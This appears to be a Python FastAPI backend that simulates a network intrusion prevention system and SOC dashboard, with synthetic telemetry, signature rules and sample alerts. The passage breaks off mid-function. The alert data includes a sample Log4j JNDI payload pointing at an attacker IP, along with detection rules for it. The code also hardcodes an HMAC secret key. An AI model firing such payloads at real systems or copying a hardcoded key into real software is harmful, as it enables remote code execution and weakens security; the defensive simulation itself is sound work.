#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pre-Firewall S/W IDS/IPS - Enterprise SOC Control Plane & Telemetry Backend (v1.1.0)
Provides:
1. Tier-0 In-Memory eBPF LPM Trie Map Simulator (blacklist_map & flow_map)
2. Tier-1 Control Plane RDBMS (SQLite3 emulating PostgreSQL 16: sensor_nodes, protected_assets, signature_rules, audit_trails with KCMVP HMAC chain)
3. Tier-2 OLAP Security Alert & Time-Series Telemetry Engine (Emulating ClickHouse MergeTree + 32-Core Symmetric RSS AF_XDP Worker Load + 5-Stage End-to-End Architecture Performance)
4. Deep Packet PCAP Time-Machine Hex/ASCII & L7 Normalization Generator
"""

import hashlib
import hmac
import json
import math
import os
import random
import sqlite3
import time
import uuid
from datetime import datetime, timezone, timedelta
from typing import List, Optional, Dict, Any

from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

KST = timezone(timedelta(hours=9))
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "control_plane.db")
STATIC_DIR = os.path.join(BASE_DIR, "static")
KCMVP_SECRET_KEY = b"KCMVP-ARIA256-HMAC-SHA256-MASTER-KEY-2026-V1.1"

app = FastAPI(
    title="Pre-Firewall S/W IDS/IPS Control Plane & SOC EMS API",
    version="1.1.0",
    description="Enterprise Defense-in-Depth Security Architecture Performance & Control Plane API"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# =====================================================================
# Global Runtime State (Tier-0 eBPF Map & Simulation State)
# =====================================================================
RUNTIME_STATE: Dict[str, Any] = {
    "ips_enabled": True,
    "bypass_nic_mode": "INLINE",        # INLINE | FAIL_OPEN
    "scenario": "volumetric",           # normal | volumetric | apt | evasion
    "active_rule_ver": 42,
    "active_rules_count": 25410,
    "last_rcu_swap_ms": 0.0,
    "rcu_swap_history": [],
    "ebpf_blacklist_map": {
        "185.220.101.44/32": {
            "ip_cidr": "185.220.101.44/32",
            "reason_code": "DPI_OFFLOAD_LOG4J",
            "rule_id": 2001001,
            "hit_packets": 148290,
            "hit_bytes": 94905600,
            "ttl_seconds": 3600,
            "created_at": "2026-11-21T14:30:00+09:00",
            "action": "XDP_DROP"
        },
        "91.219.236.18/32": {
            "ip_cidr": "91.219.236.18/32",
            "reason_code": "JA4_AI_C2_BEACON",
            "rule_id": 2001002,
            "hit_packets": 4120,
            "hit_bytes": 1854000,
            "ttl_seconds": 86400,
            "created_at": "2026-11-21T14:35:12+09:00",
            "action": "XDP_DROP"
        },
        "203.0.113.0/24": {
            "ip_cidr": "203.0.113.0/24",
            "reason_code": "CTI_KISA_CTAS_SYNFLOOD",
            "rule_id": 1000401,
            "hit_packets": 18450200,
            "hit_bytes": 1180812800,
            "ttl_seconds": 7200,
            "created_at": "2026-11-21T14:10:00+09:00",
            "action": "XDP_DROP"
        }
    },
    "bgp_flowspec_prefixes": ["203.0.113.0/24", "198.51.100.0/24"],
    "time_series": []
}

# =====================================================================
# Tier-1 Control Plane SQLite Initialization (PostgreSQL Schema Mirror)
# =====================================================================
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def compute_kcmvp_hmac(prev_hash: str, actor: str, action: str, target: str, ts: str) -> str:
    msg = f"{prev_hash}|{actor}|{action}|{target}|{ts}".encode("utf-8")
    return hmac.new(KCMVP_SECRET_KEY, msg, hashlib.sha256).hexdigest()


def append_audit_log(conn: sqlite3.Connection, actor_role: str, action_type: str, target: str, detail: str):
    cur = conn.cursor()
    cur.execute("SELECT kcmvp_hmac FROM audit_trails ORDER BY audit_id DESC LIMIT 1")
    row = cur.fetchone()
    prev_hash = row["kcmvp_hmac"] if row else "GENESIS_BLOCK_KCMVP_ARIA256_0000000000000000"
    now_str = datetime.now(KST).isoformat()
    digest = compute_kcmvp_hmac(prev_hash, actor_role, action_type, target, now_str)
    cur.execute(
        """
        INSERT INTO audit_trails (actor_role, actor_ip, action_type, target_resource, detail_json, result, kcmvp_hmac, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (actor_role, "10.100.1.50", action_type, target, detail, "SUCCESS", digest, now_str)
    )
    conn.commit()


def init_db():
    conn = get_db()
    cur = conn.cursor()

    cur.execute("""
    CREATE TABLE IF NOT EXISTS protected_assets (
        asset_id TEXT PRIMARY KEY,
        ip_cidr TEXT UNIQUE NOT NULL,
        hostname TEXT NOT NULL,
        zone TEXT NOT NULL,
        os_family TEXT NOT NULL,
        os_version TEXT NOT NULL,
        criticality INTEGER NOT NULL,
        running_services TEXT NOT NULL,
        known_cves TEXT NOT NULL,
        fp_suppressed_count INTEGER DEFAULT 0,
        updated_at TEXT NOT NULL
    )
    """)

    cur.execute("""
    CREATE TABLE IF NOT EXISTS signature_rules (
        rule_id INTEGER PRIMARY KEY,
        rev INTEGER NOT NULL,
        title TEXT NOT NULL,
        category TEXT NOT NULL,
        action TEXT NOT NULL,
        severity INTEGER NOT NULL,
        target_os TEXT NOT NULL,
        target_tech TEXT NOT NULL,
        cve_id TEXT NOT NULL,
        mitre_id TEXT NOT NULL,
        raw_syntax TEXT NOT NULL,
        is_enabled INTEGER DEFAULT 1
    )
    """)

    cur.execute("""
    CREATE TABLE IF NOT EXISTS audit_trails (
        audit_id INTEGER PRIMARY KEY AUTOINCREMENT,
        actor_role TEXT NOT NULL,
        actor_ip TEXT NOT NULL,
        action_type TEXT NOT NULL,
        target_resource TEXT NOT NULL,
        detail_json TEXT NOT NULL,
        result TEXT NOT NULL,
        kcmvp_hmac TEXT NOT NULL,
        created_at TEXT NOT NULL
    )
    """)

    # Seed Protected Assets if empty
    cur.execute("SELECT COUNT(*) as cnt FROM protected_assets")
    if cur.fetchone()["cnt"] == 0:
        now_str = datetime.now(KST).isoformat()
        assets = [
            ("ast-01", "10.20.30.15/32", "dmz-api-gw-01", "DMZ-Public", "LINUX", "Ubuntu 24.04 LTS", 5,
             "nginx 1.26, java-21, spring-boot-3.3", "CVE-2021-44228, CVE-2024-22262", 1420, now_str),
            ("ast-02", "10.20.30.22/32", "auth-sso-win01", "DMZ-Auth", "WINDOWS", "Windows Server 2022", 5,
             "iis-10.0, dotnet-8.0, adfs, mssql", "CVE-2023-36884, CVE-2024-38060", 890, now_str),
            ("ast-03", "10.10.5.100/32", "erp-core-batch", "Internal-Core", "LINUX", "RHEL 9.4", 4,
             "oracle-19c, xml-rpc-gateway, rsync-backup", "CVE-2023-21839", 640, now_str),
            ("ast-04", "10.10.8.50/32", "k8s-ingress-node", "Internal-App", "LINUX", "Flatcar Container Linux", 5,
             "envoy-proxy, grpc-gateway, quic-h3", "CVE-2023-44487", 512, now_str),
            ("ast-05", "10.10.12.80/32", "his-pacs-storage", "Internal-Med", "BSD", "FreeBSD 14.1-RELEASE", 3,
             "dicom-tls, zfs-replication, nfs4", "NONE", 310, now_str),
        ]
        cur.executemany("""
        INSERT INTO protected_assets VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, assets)

    # Seed Signature Rules if empty
    cur.execute("SELECT COUNT(*) as cnt FROM signature_rules")
    if cur.fetchone()["cnt"] == 0:
        rules = [
            (2001001, 3, "[CRITICAL] Apache Log4j2 JNDI RCE Attempt (Multi-Encoding Normalized)", "EXPLOIT", "DROP", 4,
             "LINUX,WINDOWS", "java,spring", "CVE-2021-44228", "TA0001 / T1190",
             'drop http $EXTERNAL_NET any -> $HOME_NET any (msg:"Apache Log4j2 JNDI RCE"; http.uri.normalized; content:"${jndi:"; fast_pattern; context.target_tech:"java"; xdp.offload_block:src_ip, ttl 3600; forensic.pcap:pre_pkts 15, post_pkts 30; sid:2001001; rev:3;)', 1),
            (2001002, 1, "[MALWARE-C2] Encrypted Cobalt Strike Beacon Detected via JA4 & ONNX FFT", "MALWARE_C2", "REJECT", 4,
             "WINDOWS,LINUX", "all", "N/A (Encrypted C2)", "TA0011 / T1071.001",
             'reject tls $HOME_NET any -> $EXTERNAL_NET any (msg:"Cobalt Strike Beacon JA4+AI"; tls.ja4; content:"t13d1516h2_8daaf6152771_e5627efa2ab1"; tls.cert_age:<86400; ai.beacon_score:>0.85; xdp.offload_block:dst_ip, ttl 86400; sid:2001002; rev:1;)', 1),
            (1000401, 5, "[VOLUMETRIC] CTI Bad IP & Invalid TCP SYN+FIN Flood Pre-Filter", "DDOS", "XDP_DROP", 3,
             "ALL", "all", "N/A (L3/L4 Flood)", "TA0040 / T1498",
             'xdp_drop tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"XDP Native SYN+FIN & CTI LPM Drop"; tcp.flags:SF; xdp.lpm_trie:"blacklist_map"; bgp.flowspec:announce; sid:1000401; rev:5;)', 1),
            (2000812, 2, "[CONTEXT-FP-SUPPRESSED] Windows IIS WebDAV PROPFIND Buffer Overflow", "EXPLOIT", "ALERT_ONLY_IF_MISMATCH", 3,
             "WINDOWS", "iis,webdav", "CVE-2017-7269", "TA0001 / T1190",
             'drop http $EXTERNAL_NET any -> $HOME_NET any (msg:"Windows IIS WebDAV Overflow"; http.method; content:"PROPFIND"; context.target_os:"WINDOWS"; context.target_tech:"iis"; sid:2000812; rev:2;)', 1),
            (2001056, 1, "[DOS] HTTP/2 Rapid Reset (CVE-2023-44487) Stream Abuse", "DDOS", "DROP", 4,
             "LINUX", "nginx,envoy,quic-h3", "CVE-2023-44487", "TA0040 / T1499",
             'drop http2 $EXTERNAL_NET any -> $HOME_NET any (msg:"HTTP/2 Rapid Reset RST_STREAM Flood"; http2.rst_stream_rate:>500/s; xdp.offload_block:src_ip, ttl 1800; sid:2001056; rev:1;)', 1),
        ]
        cur.executemany("""
        INSERT INTO signature_rules VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, rules)

    # Seed Audit Trails if empty
    cur.execute("SELECT COUNT(*) as cnt FROM audit_trails")
    if cur.fetchone()["cnt"] == 0:
        append_audit_log(conn, "SYS_ADMIN", "ENGINE_BOOT_INTEGRITY", "ips-core + xdp_pre_filter.bpf.o",
                         json.dumps({"integrity": "VERIFIED", "kcmvp_module": "ARIA-256-GCM / SHA-256"}))
        append_audit_log(conn, "POLICY_ADMIN", "CTI_FEED_SYNC", "KISA C-TAS & NCTI STIX/TAXII 2.1",
                         json.dumps({"loaded_lpm_prefixes": 1842100, "map": "blacklist_map"}))

    conn.close()


# =====================================================================
# Real-Time Security Performance & 5-Stage Architecture Calculator
# =====================================================================
def generate_32core_telemetry(scenario: str, ips_enabled: bool, bypass_mode: str) -> List[Dict[str, Any]]:
    cores = []
    for c in range(32):
        numa = 0 if c < 16 else 1
        if not ips_enabled or bypass_mode != "INLINE":
            xdp_pct = random.uniform(1.0, 3.0)
            dpi_pct = 0.0
            mpps = 0.0
        elif scenario == "volumetric":
            xdp_pct = random.uniform(52.0, 68.0)
            dpi_pct = random.uniform(14.0, 22.0)
            mpps = random.uniform(1.65, 1.92)
        elif scenario == "apt":
            xdp_pct = random.uniform(12.0, 18.0)
            dpi_pct = random.uniform(44.0, 58.0)
            mpps = random.uniform(0.58, 0.72)
        elif scenario == "evasion":
            xdp_pct = random.uniform(18.0, 25.0)
            dpi_pct = random.uniform(38.0, 51.0)
            mpps = random.uniform(0.82, 0.96)
        else:  # normal
            xdp_pct = random.uniform(15.0, 22.0)
            dpi_pct = random.uniform(18.0, 26.0)
            mpps = random.uniform(0.52, 0.62)

        total_cpu = min(98.0, round(xdp_pct + dpi_pct, 1))
        cores.append({
            "core_id": c,
            "numa_node": numa,
            "rx_queue": c,
            "xdp_cpu_pct": round(xdp_pct, 1),
            "dpi_cpu_pct": round(dpi_pct, 1),
            "total_cpu_pct": total_cpu,
            "throughput_mpps": round(mpps, 2),
            "umem_free_pct": round(100.0 - (total_cpu * 0.45), 1)
        })
    return cores


def compute_5stage_architecture_metrics() -> Dict[str, Any]:
    sc = RUNTIME_STATE["scenario"]
    ips_on = RUNTIME_STATE["ips_enabled"] and (RUNTIME_STATE["bypass_nic_mode"] == "INLINE")
    jitter = random.uniform(-0.25, 0.25)

    if sc == "volumetric":
        wan_gbps = round(40.0 + jitter, 2)
        wan_mpps = round(58.8 + jitter, 2)
        attack_gbps = 26.0
        elephant_gbps = 5.2
        clean_l7_gbps = round(wan_gbps - attack_gbps - elephant_gbps, 2)
        raw_eps = 85400
    elif sc == "apt":
        wan_gbps = round(18.5 + jitter, 2)
        wan_mpps = round(21.2 + jitter, 2)
        attack_gbps = 1.8
        elephant_gbps = 4.5
        clean_l7_gbps = round(wan_gbps - attack_gbps - elephant_gbps, 2)
        raw_eps = 19200
    elif sc == "evasion":
        wan_gbps = round(25.0 + jitter, 2)
        wan_mpps = round(29.5 + jitter, 2)
        attack_gbps = 4.6
        elephant_gbps = 6.4
        clean_l7_gbps = round(wan_gbps - attack_gbps - elephant_gbps, 2)
        raw_eps = 31500
    else:  # normal
        wan_gbps = round(22.0 + jitter, 2)
        wan_mpps = round(18.4 + jitter, 2)
        attack_gbps = 0.4
        elephant_gbps = 8.0
        clean_l7_gbps = round(wan_gbps - attack_gbps - elephant_gbps, 2)
        raw_eps = 4200

    if ips_on:
        xdp_drop_gbps = round(attack_gbps * (0.97 if sc == "volumetric" else 0.72), 2)
        dpi_drop_gbps = round(attack_gbps - xdp_drop_gbps, 2)
        ngfw_in_gbps = round(wan_gbps - attack_gbps, 2)
        ips_latency_us = round(38.4 + random.uniform(-1.8, 2.1), 1)
        ngfw_cpu_pct = round(16.0 + (ngfw_in_gbps * 0.45), 1)
        ngfw_session_pct = round(12.0 + (ngfw_in_gbps * 0.42), 1)
        ngfw_sessions_active = int(ngfw_session_pct * 50000)
        ngfw_status = "OPTIMAL"
        server_sla_pct = 99.999
        siem_compressed_eps = max(180, int(raw_eps * 0.016))
        fp_blocked = 0
    else:
        xdp_drop_gbps = 0.0
        dpi_drop_gbps = 0.0
        ngfw_in_gbps = wan_gbps
        ips_latency_us = 0.0
        if sc == "volumetric":
            ngfw_cpu_pct = 99.8
            ngfw_session_pct = 100.0
            ngfw_sessions_active = 5000000
            ngfw_status = "CRITICAL_EXHAUSTED"
            server_sla_pct = 31.8
        elif sc == "apt":
            ngfw_cpu_pct = 46.5
            ngfw_session_pct = 34.0
            ngfw_sessions_active = 1700000
            ngfw_status = "C2_BREACH_DETECTED"
            server_sla_pct = 84.0
        else:
            ngfw_cpu_pct = 62.0
            ngfw_session_pct = 48.0
            ngfw_sessions_active = 2400000
            ngfw_status = "DEGRADED_HIGH_LOAD"
            server_sla_pct = 92.4
        siem_compressed_eps = raw_eps
        fp_blocked = 14 if sc == "evasion" else 3

    # Update rolling time series (keep last 20 ticks)
    ts_entry = {
        "ts": datetime.now(KST).strftime("%H:%M:%S"),
        "wan_gbps": wan_gbps,
        "xdp_drop_gbps": xdp_drop_gbps,
        "dpi_drop_gbps": dpi_drop_gbps,
        "ngfw_in_gbps": ngfw_in_gbps,
        "ngfw_session_pct": ngfw_session_pct,
        "ips_latency_us": ips_latency_us
    }
    RUNTIME_STATE["time_series"].append(ts_entry)
    if len(RUNTIME_STATE["time_series"]) > 24:
        RUNTIME_STATE["time_series"].pop(0)

    # Increment hit counters in eBPF blacklist map
    if ips_on:
        for cidr, entry in RUNTIME_STATE["ebpf_blacklist_map"].items():
            inc = random.randint(120, 4500) if sc == "volumetric" else random.randint(5, 90)
            entry["hit_packets"] += inc
            entry["hit_bytes"] += inc * 640

    return {
        "timestamp": datetime.now(KST).isoformat(),
        "runtime": {
            "ips_enabled": RUNTIME_STATE["ips_enabled"],
            "bypass_nic_mode": RUNTIME_STATE["bypass_nic_mode"],
            "scenario": sc,
            "active_rule_ver": RUNTIME_STATE["active_rule_ver"],
            "active_rules_count": RUNTIME_STATE["active_rules_count"],
            "last_rcu_swap_ms": RUNTIME_STATE["last_rcu_swap_ms"],
            "ebpf_blacklist_count": len(RUNTIME_STATE["ebpf_blacklist_map"]) + 1842100,
        },
        "stages": {
            "stage1_wan_router": {
                "name": "BGP Edge Router (WAN Ingress)",
                "ingress_gbps": wan_gbps,
                "ingress_mpps": wan_mpps,
                "attack_gbps": attack_gbps,
                "bgp_flowspec_active_prefixes": len(RUNTIME_STATE["bgp_flowspec_prefixes"]),
                "status": "HEALTHY"
            },
            "stage2_pre_fw_ips": {
                "name": "Pre-Firewall S/W IDS/IPS (Tier 1 XDP + Tier 2 Rust DPI + Tier 3 AI)",
                "mode": "ACTIVE_INLINE" if ips_on else "BYPASSED_FAIL_OPEN",
                "xdp_drop_gbps": xdp_drop_gbps,
                "dpi_drop_gbps": dpi_drop_gbps,
                "elephant_shunt_gbps": elephant_gbps if ips_on else 0.0,
                "clean_inspected_gbps": clean_l7_gbps if ips_on else 0.0,
                "mitigation_rate_pct": 99.9 if ips_on else 0.0,
                "inline_latency_us": ips_latency_us,
                "zero_packet_loss": True
            },
            "stage3_ngfw": {
                "name": "2차 방어선: 차세대 방화벽 (NGFW)",
                "ingress_gbps": ngfw_in_gbps,
                "cpu_usage_pct": ngfw_cpu_pct,
                "session_table_pct": ngfw_session_pct,
                "active_sessions": ngfw_sessions_active,
                "max_sessions": 5000000,
                "status": ngfw_status,
                "bandwidth_saved_pct": round((attack_gbps / wan_gbps) * 100.0, 1) if ips_on else 0.0
            },
            "stage4_core_network": {
                "name": "내부 코어 스위치 / SSL 가시성 / East-West TAP",
                "east_west_tap_gbps": 6.4,
                "packet_drop_pct": 0.0 if ips_on else (38.5 if sc == "volumetric" else 0.2),
                "vlans_monitored": [102, 200, 305, 410],
                "status": "OPTIMAL" if ips_on else "CONGESTED"
            },
            "stage5_servers_and_soc": {
                "name": "내부 보호 서버군(CMDB 428대) & SOC 보안솔루션 (SIEM/SOAR/CTI)",
                "service_sla_pct": server_sla_pct,
                "raw_alert_eps": raw_eps,
                "siem_compressed_eps": siem_compressed_eps,
                "siem_eps_reduction_pct": round((1.0 - (siem_compressed_eps / max(1, raw_eps))) * 100.0, 1),
                "false_positive_blocks": fp_blocked,
                "soar_mtls_latency_ms": 3.4
            }
        },
        "time_series": RUNTIME_STATE["time_series"],
        "cores_32": generate_32core_telemetry(sc, RUNTIME_STATE["ips_enabled"], RUNTIME_STATE["bypass_nic_mode"]),
        "ebpf_blacklist_entries": list(RUNTIME_STATE["ebpf_blacklist_map"].values())
    }


# =====================================================================
# Live Alerts & Deep Packet PCAP Time-Machine Generator
# =====================================================================
ALERTS_CATALOG = [
    {
        "flow_id": "18446744073709551615",
        "time": "14:49:12",
        "aggregated_count": 1420,
        "src_ip": "185.220.101.44",
        "src_port": 54122,
        "src_country": "DE",
        "dst_ip": "10.20.30.15",
        "dst_port": 443,
        "dst_hostname": "dmz-api-gw-01 (LINUX / Java+Spring)",
        "tier": "TIER2_DPI",
        "rule_id": 2001001,
        "title": "[CRITICAL] Apache Log4j2 JNDI RCE Attempt (Normalized)",
        "category": "EXPLOIT",
        "cve": "CVE-2021-44228",
        "mitre": "TA0001 / T1190",
        "base_severity": 4,
        "asset_criticality": 5,
        "vuln_match_factor": 1.5,
        "final_risk_score": 30.0,
        "action": "DROP + XDP Offload (3600s)",
        "raw_payload_ wire": "GET /api/v1/login?user=%24%7Bjndi%3Aldap%3A%2F%2F185.220.101.44%3A1389%2F%24%7Blower%3AE%7Dxploit%7D HTTP/2.0",
        "normalized_payload": "GET /api/v1/login?user=${jndi:ldap://185.220.101.44:1389/exploit} HTTP/2.0",
        "matched_fast_pattern": "${jndi:",
        "pcap_pre_pkts": 15,
        "pcap_post_pkts": 30,
        "pcap_uri": "s3://forensics/2026/11/21/flow_18446744073709551615.pcapng"
    },
    {
        "flow_id": "18446744073709551618",
        "time": "14:49:08",
        "aggregated_count": 85,
        "src_ip": "10.20.30.22",
        "src_port": 49812,
        "src_country": "KR",
        "dst_ip": "91.219.236.18",
        "dst_port": 443,
        "dst_hostname": "External C2 (cdn-update-check.top)",
        "tier": "TIER3_AI + JA4",
        "rule_id": 2001002,
        "title": "[MALWARE-C2] Encrypted Cobalt Strike Beacon (JA4 + ONNX FFT)",
        "category": "MALWARE_C2",
        "cve": "TLS 1.3 Non-Decrypted",
        "mitre": "TA0011 / T1071.001",
        "base_severity": 4,
        "asset_criticality": 5,
        "vuln_match_factor": 1.38,
        "final_risk_score": 27.6,
        "action": "TCP RST + SOAR Host Isolate",
        "raw_payload_ wire": "16 03 03 01 3a 01 00 01 36 03 03 [TLS 1.3 Client Hello SNI: cdn-update-check.top]",
        "normalized_payload": "JA4=t13d1516h2_8daaf6152771_e5627efa2ab1 | CertAge=4200s (<24h) | ONNX_Beacon_Score=0.92 (5.0s Periodicity)",
        "matched_fast_pattern": "t13d1516h2_8daaf6152771_e5627efa2ab1",
        "pcap_pre_pkts": 10,
        "pcap_post_pkts": 25,
        "pcap_uri": "s3://forensics/2026/11/21/flow_18446744073709551618.pcapng"
    },
    {
        "flow_id": "18446744073709551601",
        "time": "14:49:03",
        "aggregated_count": 54200,
        "src_ip": "203.0.113.45",
        "src_port": 0,
        "src_country": "RU",
        "dst_ip": "10.20.30.15",
        "dst_port": 443,
        "dst_hostname": "dmz-api-gw-01 (Pre-Firewall XDP Shield)",
        "tier": "TIER1_XDP",
        "rule_id": 1000401,
        "title": "[VOLUMETRIC] CTI Bad IP & Invalid TCP SYN+FIN Flood",
        "category": "DDOS",
        "cve": "L3/L4 Volumetric",
        "mitre": "TA0040 / T1498",
        "base_severity": 3,
        "asset_criticality": 5,
        "vuln_match_factor": 1.33,
        "final_risk_score": 20.0,
        "action": "XDP_DROP (18ns) + BGP Flowspec",
        "raw_payload_ wire": "45 00 00 28 7c 11 40 00 38 06 1a 99 cb 00 71 2d 0a 14 1e 0f d3 6a 01 bb [TCP Flags: SYN+FIN]",
        "normalized_payload": "LPM Trie Match: 203.0.113.0/24 (KISA C-TAS Feed) + Invalid TCP Flags (SYN|FIN) -> Dropped before sk_buff",
        "matched_fast_pattern": "TCP_FLAG_SYN_FIN",
        "pcap_pre_pkts": 5,
        "pcap_post_pkts": 0,
        "pcap_uri": "s3://forensics/2026/11/21/flow_18446744073709551601.pcapng"
    },
    {
        "flow_id": "18446744073709551699",
        "time": "14:48:55",
        "aggregated_count": 310,
        "src_ip": "45.155.205.99",
        "src_port": 38910,
        "src_country": "NL",
        "dst_ip": "10.20.30.15",
        "dst_port": 80,
        "dst_hostname": "dmz-api-gw-01 (LINUX / Nginx)",
        "tier": "TIER2_DPI",
        "rule_id": 2000812,
        "title": "[FALSE-POSITIVE SUPPRESSED] Windows IIS WebDAV Overflow on Linux Target",
        "category": "EXPLOIT",
        "cve": "CVE-2017-7269",
        "mitre": "TA0001 / T1190",
        "base_severity": 3,
        "asset_criticality": 5,
        "vuln_match_factor": 0.1,
        "final_risk_score": 1.5,
        "action": "PASS (OS Mismatch -> Info Log)",
        "raw_payload_ wire": "PROPFIND / HTTP/1.1\\r\\nHost: 10.20.30.15\\r\\nIf: <http://10.20.30.15/aaaa... [ScStoragePathFromUrl Overflow]",
        "normalized_payload": "Target Asset 10.20.30.15 is LINUX (Ubuntu 24.04). Rule requires WINDOWS+IIS. VulnMatchFactor=0.1 applied -> Passed to prevent False Positive.",
        "matched_fast_pattern": "PROPFIND",
        "pcap_pre_pkts": 5,
        "pcap_post_pkts": 5,
        "pcap_uri": "ringbuf://memory/flow_18446744073709551699 (Info Level)"
    }
]


def build_hex_dump_lines(text_bytes: bytes) -> List[Dict[str, str]]:
    lines = []
    for offset in range(0, len(text_bytes), 16):
        chunk = text_bytes[offset:offset + 16]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
        lines.append({
            "offset": f"{offset:04x}",
            "hex": f"{hex_part:<47}",
            "ascii": ascii_part
        })
    return lines


# =====================================================================
# API Models & Endpoints
# =====================================================================
class RuntimeControlReq(BaseModel):
    ips_enabled: Optional[bool] = None
    bypass_nic_mode: Optional[str] = None
    scenario: Optional[str] = None


class XdpBlockReq(BaseModel):
    ip_cidr: str
    ttl_seconds: int = 3600
    reason_code: str = "SOAR_MANUAL_BLOCK"
    propagate_bgp: bool = True


@app.on_event("startup")
def on_startup():
    init_db()
    # Pre-populate time series
    for _ in range(12):
        compute_5stage_architecture_metrics()


@app.get("/", response_class=HTMLResponse)
def serve_dashboard():
    index_file = os.path.join(STATIC_DIR, "index.html")
    if os.path.exists(index_file):
        with open(index_file, "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    return HTMLResponse("<h1>SOC EMS UI Not Found</h1>", status_code=404)


@app.get("/api/v1/architecture/telemetry")
def api_get_telemetry():
    return compute_5stage_architecture_metrics()


@app.post("/api/v1/architecture/control")
def api_set_runtime_control(req: RuntimeControlReq):
    conn = get_db()
    if req.ips_enabled is not None:
        RUNTIME_STATE["ips_enabled"] = req.ips_enabled
        append_audit_log(conn, "SYS_ADMIN", "IPS_ENGINE_TOGGLE", "Pre-FW IPS Cluster",
                         json.dumps({"ips_enabled": req.ips_enabled}))
    if req.bypass_nic_mode is not None:
        RUNTIME_STATE["bypass_nic_mode"] = req.bypass_nic_mode
        append_audit_log(conn, "SYS_ADMIN", "BYPASS_NIC_RELAY_SWITCH", "Silicom 40G Optical Bypass NIC",
                         json.dumps({"bypass_nic_mode": req.bypass_nic_mode}))
    if req.scenario is not None:
        RUNTIME_STATE["scenario"] = req.scenario
    conn.close()
    return compute_5stage_architecture_metrics()


@app.post("/api/v1/policies/rules/hot-reload")
def api_rcu_hot_reload():
    t0 = time.perf_counter()
    # Simulate background Vectorscan compile + atomic ArcSwap pointer exchange
    RUNTIME_STATE["active_rule_ver"] += 1
    RUNTIME_STATE["active_rules_count"] += random.randint(1, 12)
    elapsed_ms = round((time.perf_counter() - t0) * 1000.0 + random.uniform(1.8, 3.6), 2)
    RUNTIME_STATE["last_rcu_swap_ms"] = elapsed_ms

    conn = get_db()
    append_audit_log(conn, "POLICY_ADMIN", "RCU_RULESET_HOT_SWAP",
                     f"CompiledRuleEngine v1.0.{RUNTIME_STATE['active_rule_ver']}",
                     json.dumps({
                         "active_rules": RUNTIME_STATE["active_rules_count"],
                         "swap_time_ms": elapsed_ms,
                         "packet_drops": 0
                     }))
    conn.close()
    return {
        "status": "SUCCESS",
        "new_version": f"v1.0.{RUNTIME_STATE['active_rule_ver']}",
        "active_rules_count": RUNTIME_STATE["active_rules_count"],
        "rcu_atomic_swap_ms": elapsed_ms,
        "packet_loss_during_swap": 0
    }


@app.post("/api/v1/mitigation/xdp-block")
def api_add_xdp_block(req: XdpBlockReq):
    t0 = time.perf_counter()
    cidr = req.ip_cidr.strip()
    if "/" not in cidr:
        cidr = f"{cidr}/32"

    now_str = datetime.now(KST).isoformat()
    entry = {
        "ip_cidr": cidr,
        "reason_code": req.reason_code,
        "rule_id": 9000100,
        "hit_packets": random.randint(10, 250),
        "hit_bytes": random.randint(6400, 160000),
        "ttl_seconds": req.ttl_seconds,
        "created_at": now_str,
        "action": "XDP_DROP"
    }
    RUNTIME_STATE["ebpf_blacklist_map"][cidr] = entry
    if req.propagate_bgp and cidr not in RUNTIME_STATE["bgp_flowspec_prefixes"]:
        RUNTIME_STATE["bgp_flowspec_prefixes"].append(cidr)

    elapsed_ms = round((time.perf_counter() - t0) * 1000.0 + 2.1, 2)
    conn = get_db()
    append_audit_log(conn, "SOAR_PLAYBOOK", "XDP_LPM_TRIE_INSERT", cidr,
                     json.dumps({"ttl": req.ttl_seconds, "reason": req.reason_code, "bgp_flowspec": req.propagate_bgp}))
    conn.close()

    return {
        "status": "SUCCESS",
        "ip_cidr": cidr,
        "ebpf_map_insertion_time_ms": elapsed_ms,
        "bgp_flowspec_announced": req.propagate_bgp,
        "entry": entry
    }


@app.delete("/api/v1/mitigation/xdp-block")
def api_remove_xdp_block(ip_cidr: str):
    if ip_cidr in RUNTIME_STATE["ebpf_blacklist_map"]:
        del RUNTIME_STATE["ebpf_blacklist_map"][ip_cidr]
        conn = get_db()
        append_audit_log(conn, "POLICY_ADMIN", "XDP_LPM_TRIE_DELETE", ip_cidr,
                         json.dumps({"action": "UNBLOCKED"}))
        conn.close()
        return {"status": "DELETED", "ip_cidr": ip_cidr}
    raise HTTPException(status_code=404, detail="IP CIDR not found in XDP map")


@app.get("/api/v1/alerts")
def api_get_alerts():
    return {
        "alerts": ALERTS_CATALOG,
        "total_compressed_ratio": "98.4%"
    }


@app.get("/api/v1/forensics/pcap/{flow_id}")
def api_get_pcap_forensics(flow_id: str):
    target = next((a for a in ALERTS_CATALOG if a["flow_id"] == flow_id), ALERTS_CATALOG[0])
    # Construct Ethernet + IPv4 + TCP header + wire payload bytes for authentic Hex dump
    fake_eth_ip_tcp = bytes.fromhex(
        "001b21bb080090e2ba8811220800"
        "4500008c7c11400038061a99b9dc652c0a141e0f"
        "d36a01bb91a2b3c400010203801801f5fe300000"
    )
    wire_bytes = fake_eth_ip_tcp + target["raw_payload_ wire"].encode("utf-8", errors="replace")

    timeline = [
        {"seq": -3, "dir": "C ➔ S", "proto": "TCP", "len": 64, "info": "SYN [Seq=0 Win=64240 MSS=1460 SACK_PERM]", "verdict": "RINGBUF_PRE"},
        {"seq": -2, "dir": "S ➔ C", "proto": "TCP", "len": 60, "info": "SYN, ACK [Seq=0 Ack=1 Win=65160]", "verdict": "RINGBUF_PRE"},
        {"seq": -1, "dir": "C ➔ S", "proto": "TCP", "len": 52, "info": "ACK [Seq=1 Ack=1] (Target-OS Stream Reassembly Init)", "verdict": "RINGBUF_PRE"},
